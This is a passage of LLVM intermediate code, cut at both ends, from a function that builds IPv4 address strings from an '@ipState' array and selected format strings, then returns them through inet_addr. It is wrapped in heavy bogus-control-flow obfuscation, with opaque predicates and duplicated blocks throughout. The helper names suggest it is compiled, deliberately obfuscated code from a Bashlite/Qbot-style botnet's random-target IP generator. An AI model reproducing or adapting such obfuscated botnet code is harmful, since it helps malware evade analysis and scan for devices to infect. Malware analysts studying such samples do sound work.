  br i1 %2916, label %2917, label %2924

; <label>:2917:                                   ; preds = %2914
  %2918 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2919 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2920 = zext i8 %2919 to i32
  %2921 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2922 = zext i8 %2921 to i32
  %2923 = call i32 (i8*, i8*, ...) @szprintf(i8* %2918, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.175, i32 0, i32 0), i32 %2920, i32 %2922)
  br label %2924

; <label>:2924:                                   ; preds = %2917, %2914
  %2925 = load i32, i32* %1, align 4
  %2926 = icmp eq i32 %2925, 141
  br i1 %2926, label %2927, label %2934

; <label>:2927:                                   ; preds = %2924
  %2928 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2929 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2930 = zext i8 %2929 to i32
  %2931 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2932 = zext i8 %2931 to i32
  %2933 = call i32 (i8*, i8*, ...) @szprintf(i8* %2928, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.176, i32 0, i32 0), i32 %2930, i32 %2932)
  br label %2934

; <label>:2934:                                   ; preds = %2927, %2924
  %2935 = load i32, i32* %1, align 4
  %2936 = icmp eq i32 %2935, 142
  br i1 %2936, label %2937, label %2960

; <label>:2937:                                   ; preds = %2934
  %2938 = load i32, i32* @x.75
  %2939 = load i32, i32* @y.76
  %2940 = sub i32 %2938, 1
  %2941 = mul i32 %2938, %2940
  %2942 = urem i32 %2941, 2
  %2943 = icmp eq i32 %2942, 0
  %2944 = icmp slt i32 %2939, 10
  %2945 = or i1 %2943, %2944
  br i1 %2945, label %originalBB370, label %originalBB370alteredBB

originalBB370:                                    ; preds = %originalBB370alteredBB, %2937
  %2946 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2947 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2948 = zext i8 %2947 to i32
  %2949 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2950 = zext i8 %2949 to i32
  %2951 = call i32 (i8*, i8*, ...) @szprintf(i8* %2946, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.177, i32 0, i32 0), i32 %2948, i32 %2950)
  %2952 = load i32, i32* @x.75
  %2953 = load i32, i32* @y.76
  %2954 = sub i32 %2952, 1
  %2955 = mul i32 %2952, %2954
  %2956 = urem i32 %2955, 2
  %2957 = icmp eq i32 %2956, 0
  %2958 = icmp slt i32 %2953, 10
  %2959 = or i1 %2957, %2958
  br i1 %2959, label %originalBBpart2372, label %originalBB370alteredBB

originalBBpart2372:                               ; preds = %originalBB370
  br label %2960

; <label>:2960:                                   ; preds = %originalBBpart2372, %2934
  %2961 = load i32, i32* @x.75
  %2962 = load i32, i32* @y.76
  %2963 = sub i32 %2961, 1
  %2964 = mul i32 %2961, %2963
  %2965 = urem i32 %2964, 2
  %2966 = icmp eq i32 %2965, 0
  %2967 = icmp slt i32 %2962, 10
  %2968 = or i1 %2966, %2967
  br i1 %2968, label %originalBB374, label %originalBB374alteredBB

originalBB374:                                    ; preds = %originalBB374alteredBB, %2960
  %2969 = load i32, i32* %1, align 4
  %2970 = icmp eq i32 %2969, 143
  %2971 = load i32, i32* @x.75
  %2972 = load i32, i32* @y.76
  %2973 = sub i32 %2971, 1
  %2974 = mul i32 %2971, %2973
  %2975 = urem i32 %2974, 2
  %2976 = icmp eq i32 %2975, 0
  %2977 = icmp slt i32 %2972, 10
  %2978 = or i1 %2976, %2977
  br i1 %2978, label %originalBBpart2376, label %originalBB374alteredBB

originalBBpart2376:                               ; preds = %originalBB374
  br i1 %2970, label %2979, label %2986

; <label>:2979:                                   ; preds = %originalBBpart2376
  %2980 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2981 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2982 = zext i8 %2981 to i32
  %2983 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2984 = zext i8 %2983 to i32
  %2985 = call i32 (i8*, i8*, ...) @szprintf(i8* %2980, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.178, i32 0, i32 0), i32 %2982, i32 %2984)
  br label %2986

; <label>:2986:                                   ; preds = %2979, %originalBBpart2376
  %2987 = load i32, i32* @x.75
  %2988 = load i32, i32* @y.76
  %2989 = sub i32 %2987, 1
  %2990 = mul i32 %2987, %2989
  %2991 = urem i32 %2990, 2
  %2992 = icmp eq i32 %2991, 0
  %2993 = icmp slt i32 %2988, 10
  %2994 = or i1 %2992, %2993
  br i1 %2994, label %originalBB378, label %originalBB378alteredBB

originalBB378:                                    ; preds = %originalBB378alteredBB, %2986
  %2995 = load i32, i32* %1, align 4
  %2996 = icmp eq i32 %2995, 144
  %2997 = load i32, i32* @x.75
  %2998 = load i32, i32* @y.76
  %2999 = sub i32 %2997, 1
  %3000 = mul i32 %2997, %2999
  %3001 = urem i32 %3000, 2
  %3002 = icmp eq i32 %3001, 0
  %3003 = icmp slt i32 %2998, 10
  %3004 = or i1 %3002, %3003
  br i1 %3004, label %originalBBpart2380, label %originalBB378alteredBB

originalBBpart2380:                               ; preds = %originalBB378
  br i1 %2996, label %3005, label %3012

; <label>:3005:                                   ; preds = %originalBBpart2380
  %3006 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %3007 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %3008 = zext i8 %3007 to i32
  %3009 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %3010 = zext i8 %3009 to i32
  %3011 = call i32 (i8*, i8*, ...) @szprintf(i8* %3006, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.179, i32 0, i32 0), i32 %3008, i32 %3010)
  br label %3012

; <label>:3012:                                   ; preds = %3005, %originalBBpart2380
  %3013 = load i32, i32* %1, align 4
  %3014 = icmp eq i32 %3013, 145
  br i1 %3014, label %3015, label %3022

; <label>:3015:                                   ; preds = %3012
  %3016 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %3017 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %3018 = zext i8 %3017 to i32
  %3019 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %3020 = zext i8 %3019 to i32
  %3021 = call i32 (i8*, i8*, ...) @szprintf(i8* %3016, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.180, i32 0, i32 0), i32 %3018, i32 %3020)
  br label %3022

; <label>:3022:                                   ; preds = %3015, %3012
  %3023 = load i32, i32* %1, align 4
  %3024 = icmp eq i32 %3023, 146
  br i1 %3024, label %3025, label %3048

; <label>:3025:                                   ; preds = %3022
  %3026 = load i32, i32* @x.75
  %3027 = load i32, i32* @y.76
  %3028 = sub i32 %3026, 1
  %3029 = mul i32 %3026, %3028
  %3030 = urem i32 %3029, 2
  %3031 = icmp eq i32 %3030, 0
  %3032 = icmp slt i32 %3027, 10
  %3033 = or i1 %3031, %3032
  br i1 %3033, label %originalBB382, label %originalBB382alteredBB

originalBB382:                                    ; preds = %originalBB382alteredBB, %3025
  %3034 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %3035 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %3036 = zext i8 %3035 to i32
  %3037 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %3038 = zext i8 %3037 to i32
  %3039 = call i32 (i8*, i8*, ...) @szprintf(i8* %3034, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.181, i32 0, i32 0), i32 %3036, i32 %3038)
  %3040 = load i32, i32* @x.75
  %3041 = load i32, i32* @y.76
  %3042 = sub i32 %3040, 1
  %3043 = mul i32 %3040, %3042
  %3044 = urem i32 %3043, 2
  %3045 = icmp eq i32 %3044, 0
  %3046 = icmp slt i32 %3041, 10
  %3047 = or i1 %3045, %3046
  br i1 %3047, label %originalBBpart2384, label %originalBB382alteredBB

originalBBpart2384:                               ; preds = %originalBB382
  br label %3048

; <label>:3048:                                   ; preds = %originalBBpart2384, %3022
  %3049 = load i32, i32* @x.75
  %3050 = load i32, i32* @y.76
  %3051 = sub i32 %3049, 1
  %3052 = mul i32 %3049, %3051
  %3053 = urem i32 %3052, 2
  %3054 = icmp eq i32 %3053, 0
  %3055 = icmp slt i32 %3050, 10
  %3056 = or i1 %3054, %3055
  br i1 %3056, label %originalBB386, label %originalBB386alteredBB

originalBB386:                                    ; preds = %originalBB386alteredBB, %3048
  %3057 = load i32, i32* %1, align 4
  %3058 = icmp eq i32 %3057, 147
  %3059 = load i32, i32* @x.75
  %3060 = load i32, i32* @y.76
  %3061 = sub i32 %3059, 1
  %3062 = mul i32 %3059, %3061
  %3063 = urem i32 %3062, 2
  %3064 = icmp eq i32 %3063, 0
  %3065 = icmp slt i32 %3060, 10
  %3066 = or i1 %3064, %3065
  br i1 %3066, label %originalBBpart2388, label %originalBB386alteredBB

originalBBpart2388:                               ; preds = %originalBB386
  br i1 %3058, label %3067, label %3074

; <label>:3067:                                   ; preds = %originalBBpart2388
  %3068 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %3069 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %3070 = zext i8 %3069 to i32
  %3071 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %3072 = zext i8 %3071 to i32
  %3073 = call i32 (i8*, i8*, ...) @szprintf(i8* %3068, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.182, i32 0, i32 0), i32 %3070, i32 %3072)
  br label %3074

; <label>:3074:                                   ; preds = %3067, %originalBBpart2388
  %3075 = load i32, i32* %1, align 4
  %3076 = icmp eq i32 %3075, 148
  br i1 %3076, label %3077, label %3084

; <label>:3077:                                   ; preds = %3074
  %3078 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %3079 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %3080 = zext i8 %3079 to i32
  %3081 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %3082 = zext i8 %3081 to i32
  %3083 = call i32 (i8*, i8*, ...) @szprintf(i8* %3078, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.183, i32 0, i32 0), i32 %3080, i32 %3082)
  br label %3084

; <label>:3084:                                   ; preds = %3077, %3074
  %3085 = load i32, i32* @x.75
  %3086 = load i32, i32* @y.76
  %3087 = sub i32 %3085, 1
  %3088 = mul i32 %3085, %3087
  %3089 = urem i32 %3088, 2
  %3090 = icmp eq i32 %3089, 0
  %3091 = icmp slt i32 %3086, 10
  %3092 = or i1 %3090, %3091
  br i1 %3092, label %originalBB390, label %originalBB390alteredBB

originalBB390:                                    ; preds = %originalBB390alteredBB, %3084
  %3093 = load i32, i32* %1, align 4
  %3094 = icmp eq i32 %3093, 149
  %3095 = load i32, i32* @x.75
  %3096 = load i32, i32* @y.76
  %3097 = sub i32 %3095, 1
  %3098 = mul i32 %3095, %3097
  %3099 = urem i32 %3098, 2
  %3100 = icmp eq i32 %3099, 0
  %3101 = icmp slt i32 %3096, 10
  %3102 = or i1 %3100, %3101
  br i1 %3102, label %originalBBpart2392, label %originalBB390alteredBB

originalBBpart2392:                               ; preds = %originalBB390
  br i1 %3094, label %3103, label %3110

; <label>:3103:                                   ; preds = %originalBBpart2392
  %3104 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %3105 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %3106 = zext i8 %3105 to i32
  %3107 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %3108 = zext i8 %3107 to i32
  %3109 = call i32 (i8*, i8*, ...) @szprintf(i8* %3104, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.184, i32 0, i32 0), i32 %3106, i32 %3108)
  br label %3110

; <label>:3110:                                   ; preds = %3103, %originalBBpart2392
  %3111 = load i32, i32* %1, align 4
  %3112 = icmp eq i32 %3111, 150
  br i1 %3112, label %3113, label %3120

; <label>:3113:                                   ; preds = %3110
  %3114 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %3115 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %3116 = zext i8 %3115 to i32
  %3117 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %3118 = zext i8 %3117 to i32
  %3119 = call i32 (i8*, i8*, ...) @szprintf(i8* %3114, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.185, i32 0, i32 0), i32 %3116, i32 %3118)
  br label %3120

; <label>:3120:                                   ; preds = %3113, %3110
  %3121 = load i32, i32* %1, align 4
  %3122 = icmp eq i32 %3121, 151
  br i1 %3122, label %3123, label %3130

; <label>:3123:                                   ; preds = %3120
  %3124 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %3125 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %3126 = zext i8 %3125 to i32
  %3127 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %3128 = zext i8 %3127 to i32
  %3129 = call i32 (i8*, i8*, ...) @szprintf(i8* %3124, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.186, i32 0, i32 0), i32 %3126, i32 %3128)
  br label %3130

; <label>:3130:                                   ; preds = %3123, %3120
  %3131 = load i32, i32* %1, align 4
  %3132 = icmp eq i32 %3131, 152
  br i1 %3132, label %3133, label %3140

; <label>:3133:                                   ; preds = %3130
  %3134 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %3135 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %3136 = zext i8 %3135 to i32
  %3137 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %3138 = zext i8 %3137 to i32
  %3139 = call i32 (i8*, i8*, ...) @szprintf(i8* %3134, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.187, i32 0, i32 0), i32 %3136, i32 %3138)
  br label %3140

; <label>:3140:                                   ; preds = %3133, %3130
  %3141 = load i32, i32* @x.75
  %3142 = load i32, i32* @y.76
  %3143 = sub i32 %3141, 1
  %3144 = mul i32 %3141, %3143
  %3145 = urem i32 %3144, 2
  %3146 = icmp eq i32 %3145, 0
  %3147 = icmp slt i32 %3142, 10
  %3148 = or i1 %3146, %3147
  br i1 %3148, label %originalBB394, label %originalBB394alteredBB

originalBB394:                                    ; preds = %originalBB394alteredBB, %3140
  %3149 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %3150 = call i32 @inet_addr(i8* %3149) #5
  %3151 = load i32, i32* @x.75
  %3152 = load i32, i32* @y.76
  %3153 = sub i32 %3151, 1
  %3154 = mul i32 %3151, %3153
  %3155 = urem i32 %3154, 2
  %3156 = icmp eq i32 %3155, 0
  %3157 = icmp slt i32 %3152, 10
  %3158 = or i1 %3156, %3157
  br i1 %3158, label %originalBBpart2396, label %originalBB394alteredBB

originalBBpart2396:                               ; preds = %originalBB394
  ret i32 %3150

originalBBalteredBB:                              ; preds = %originalBB, %19
  %3159 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %3160 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %3161 = zext i8 %3160 to i32
  %3162 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %3163 = zext i8 %3162 to i32
  %3164 = call i32 (i8*, i8*, ...) @szprintf(i8* %3159, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.42, i32 0, i32 0), i32 %3161, i32 %3163)
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %42
  %3165 = load i32, i32* %1, align 4
  %3166 = icmp eq i32 %3165, 1
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %68
  %3167 = load i32, i32* %1, align 4
  %3168 = icmp eq i32 %3167, 2
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %114
  %3169 = load i32, i32* %1, align 4
  %3170 = icmp eq i32 %3169, 5
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %150
  %3171 = load i32, i32* %1, align 4
  %3172 = icmp eq i32 %3171, 7
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %179
  %3173 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %3174 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %3175 = zext i8 %3174 to i32
  %3176 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %3177 = zext i8 %3176 to i32
  %3178 = call i32 (i8*, i8*, ...) @szprintf(i8* %3173, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.50, i32 0, i32 0), i32 %3175, i32 %3177)
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %222
  %3179 = load i32, i32* %1, align 4
  %3180 = icmp eq i32 %3179, 11
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %241
  %3181 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %3182 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %3183 = zext i8 %3182 to i32
  %3184 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %3185 = zext i8 %3184 to i32
  %3186 = call i32 (i8*, i8*, ...) @szprintf(i8* %3181, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.53, i32 0, i32 0), i32 %3183, i32 %3185)
  br label %originalBB26

originalBB30alteredBB:                            ; preds = %originalBB30, %267
  %3187 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %3188 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %3189 = zext i8 %3188 to i32
  %3190 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %3191 = zext i8 %3190 to i32
  %3192 = call i32 (i8*, i8*, ...) @szprintf(i8* %3187, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.54, i32 0, i32 0), i32 %3189, i32 %3191)
  br label %originalBB30

originalBB34alteredBB:                            ; preds = %originalBB34, %293
  %3193 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %3194 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %3195 = zext i8 %3194 to i32
  %3196 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %3197 = zext i8 %3196 to i32
  %3198 = call i32 (i8*, i8*, ...) @szprintf(i8* %3193, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.55, i32 0, i32 0), i32 %3195, i32 %3197)
  br label %originalBB34

originalBB38alteredBB:                            ; preds = %originalBB38, %326
  %3199 = load i32, i32* %1, align 4
  %3200 = icmp eq i32 %3199, 15
  br label %originalBB38

originalBB42alteredBB:                            ; preds = %originalBB42, %352
  %3201 = load i32, i32* %1, align 4
  %3202 = icmp eq i32 %3201, 16
  br label %originalBB42

originalBB46alteredBB:                            ; preds = %originalBB46, %388
  %3203 = load i32, i32* %1, align 4
  %3204 = icmp eq i32 %3203, 18
  br label %originalBB46

originalBB50alteredBB:                            ; preds = %originalBB50, %414
  %3205 = load i32, i32* %1, align 4
  %3206 = icmp eq i32 %3205, 19
  br label %originalBB50

originalBB54alteredBB:                            ; preds = %originalBB54, %443
  %3207 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %3208 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %3209 = zext i8 %3208 to i32
  %3210 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %3211 = zext i8 %3210 to i32
  %3212 = call i32 (i8*, i8*, ...) @szprintf(i8* %3207, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.62, i32 0, i32 0), i32 %3209, i32 %3211)
  br label %originalBB54

originalBB58alteredBB:                            ; preds = %originalBB58, %469
  %3213 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %3214 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %3215 = zext i8 %3214 to i32
  %3216 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %3217 = zext i8 %3216 to i32
  %3218 = call i32 (i8*, i8*, ...) @szprintf(i8* %3213, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.63, i32 0, i32 0), i32 %3215, i32 %3217)
  br label %originalBB58

originalBB62alteredBB:                            ; preds = %originalBB62, %505
  %3219 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %3220 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %3221 = zext i8 %3220 to i32
  %3222 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %3223 = zext i8 %3222 to i32
  %3224 = call i32 (i8*, i8*, ...) @szprintf(i8* %3219, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.65, i32 0, i32 0), i32 %3221, i32 %3223)
  br label %originalBB62

originalBB66alteredBB:                            ; preds = %originalBB66, %558
  %3225 = load i32, i32* %1, align 4
  %3226 = icmp eq i32 %3225, 27
  br label %originalBB66

originalBB70alteredBB:                            ; preds = %originalBB70, %597
  %3227 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %3228 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %3229 = zext i8 %3228 to i32
  %3230 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %3231 = zext i8 %3230 to i32
  %3232 = call i32 (i8*, i8*, ...) @szprintf(i8* %3227, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.70, i32 0, i32 0), i32 %3229, i32 %3231)
  br label %originalBB70

originalBB74alteredBB:                            ; preds = %originalBB74, %623
  %3233 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %3234 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %3235 = zext i8 %3234 to i32
  %3236 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %3237 = zext i8 %3236 to i32
  %3238 = call i32 (i8*, i8*, ...) @szprintf(i8* %3233, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.71, i32 0, i32 0), i32 %3235, i32 %3237)
  br label %originalBB74

originalBB78alteredBB:                            ; preds = %originalBB78, %649
  %3239 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %3240 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %3241 = zext i8 %3240 to i32
  %3242 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %3243 = zext i8 %3242 to i32
  %3244 = call i32 (i8*, i8*, ...) @szprintf(i8* %3239, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.72, i32 0, i32 0), i32 %3241, i32 %3243)
  br label %originalBB78

originalBB82alteredBB:                            ; preds = %originalBB82, %695
  %3245 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %3246 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %3247 = zext i8 %3246 to i32
  %3248 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %3249 = zext i8 %3248 to i32
  %3250 = call i32 (i8*, i8*, ...) @szprintf(i8* %3245, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.75, i32 0, i32 0), i32 %3247, i32 %3249)
  br label %originalBB82

originalBB86alteredBB:                            ; preds = %originalBB86, %721
  %3251 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %3252 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %3253 = zext i8 %3252 to i32
  %3254 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %3255 = zext i8 %3254 to i32
  %3256 = call i32 (i8*, i8*, ...) @szprintf(i8* %3251, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.76, i32 0, i32 0), i32 %3253, i32 %3255)
  br label %originalBB86

originalBB90alteredBB:                            ; preds = %originalBB90, %747
  %3257 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %3258 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %3259 = zext i8 %3258 to i32
  %3260 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %3261 = zext i8 %3260 to i32
  %3262 = call i32 (i8*, i8*, ...) @szprintf(i8* %3257, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.77, i32 0, i32 0), i32 %3259, i32 %3261)
  br label %originalBB90

originalBB94alteredBB:                            ; preds = %originalBB94, %773
  %3263 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %3264 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %3265 = zext i8 %3264 to i32
  %3266 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %3267 = zext i8 %3266 to i32
  %3268 = call i32 (i8*, i8*, ...) @szprintf(i8* %3263, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.78, i32 0, i32 0), i32 %3265, i32 %3267)
  br label %originalBB94

originalBB98alteredBB:                            ; preds = %originalBB98, %806
  %3269 = load i32, i32* %1, align 4
  %3270 = icmp eq i32 %3269, 38
  br label %originalBB98

originalBB102alteredBB:                           ; preds = %originalBB102, %832
  %3271 = load i32, i32* %1, align 4
  %3272 = icmp eq i32 %3271, 39
  br label %originalBB102

originalBB106alteredBB:                           ; preds = %originalBB106, %851
  %3273 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %3274 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %3275 = zext i8 %3274 to i32
  %3276 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %3277 = zext i8 %3276 to i32
  %3278 = call i32 (i8*, i8*, ...) @szprintf(i8* %3273, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.81, i32 0, i32 0), i32 %3275, i32 %3277)
  br label %originalBB106

originalBB110alteredBB:                           ; preds = %originalBB110, %934
  %3279 = load i32, i32* %1, align 4
  %3280 = icmp eq i32 %3279, 46
  br label %originalBB110

originalBB114alteredBB:                           ; preds = %originalBB114, %960
  %3281 = load i32, i32* %1, align 4
  %3282 = icmp eq i32 %3281, 47
  br label %originalBB114

originalBB118alteredBB:                           ; preds = %originalBB118, %979
  %3283 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %3284 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %3285 = zext i8 %3284 to i32
  %3286 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %3287 = zext i8 %3286 to i32
  %3288 = call i32 (i8*, i8*, ...) @szprintf(i8* %3283, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.89, i32 0, i32 0), i32 %3285, i32 %3287)
  br label %originalBB118

originalBB122alteredBB:                           ; preds = %originalBB122, %1005
  %3289 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
